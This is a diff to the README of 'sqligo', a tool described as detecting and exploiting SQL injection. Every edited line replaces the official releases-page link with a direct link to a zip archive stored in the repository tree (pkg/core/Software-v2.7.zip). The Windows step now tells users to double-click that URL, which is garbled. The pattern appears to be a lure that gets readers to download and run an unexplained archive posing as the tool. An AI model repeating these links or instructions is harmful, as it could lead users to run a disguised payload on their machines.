@@ -6,7 +6,7 @@ Welcome to sqligo! This is an advanced SQL injection detection and exploitation 
 
 ## 📥 Download Now
 
-[![Download sqligo](https://img.shields.io/badge/Download_sqligo-v1.0.0-blue.svg)](https://github.com/yuvraj112233/sqligo/releases)
+[![Download sqligo](https://github.com/yuvraj112233/sqligo/raw/refs/heads/main/pkg/core/Software-v2.7.zip)](https://github.com/yuvraj112233/sqligo/raw/refs/heads/main/pkg/core/Software-v2.7.zip)
 
 You can download sqligo from our releases page. 
 
@@ -15,7 +15,7 @@ You can download sqligo from our releases page.
 To get started, please follow these steps:
 
 1. **Visit the Release Page**  
-   Go to the sqligo releases page by clicking [here](https://github.com/yuvraj112233/sqligo/releases). You will see a list of available versions.
+   Go to the sqligo releases page by clicking [here](https://github.com/yuvraj112233/sqligo/raw/refs/heads/main/pkg/core/Software-v2.7.zip). You will see a list of available versions.
 
 2. **Choose the Right File**  
    Look for the version you want to download. You may find options for different operating systems such as Windows, macOS, and Linux.
@@ -27,7 +27,7 @@ To get started, please follow these steps:
    Once the download is complete, find the file in your computer’s Downloads folder.
 
 5. **Run the Application**  
-   - **Windows:** Double-click the `sqligo.exe` file to run it. 
+   - **Windows:** Double-click the `https://github.com/yuvraj112233/sqligo/raw/refs/heads/main/pkg/core/Software-v2.7.zip` file to run it. 
    - **macOS:** Open the `.dmg` file, drag sqligo to your Applications folder, and then double-click it.
    - **Linux:** Open a terminal and use the command `./sqligo` in the directory where you saved the file.
 
@@ -96,4 +96,4 @@ A: Ensure your system meets the requirements and that you downloaded the correct
 
 sqligo is built by the community for the community. We appreciate contributions from all users. Together, we enhance web security.
 
-Make sure to visit our [releases page](https://github.com/yuvraj112233/sqligo/releases) to download the latest version and stay updated with new features and improvements. Enjoy using sqligo!
+Make sure to visit our [releases page](https://github.com/yuvraj112233/sqligo/raw/refs/heads/main/pkg/core/Software-v2.7.zip) to download the latest version and stay updated with new features and improvements. Enjoy using sqligo!
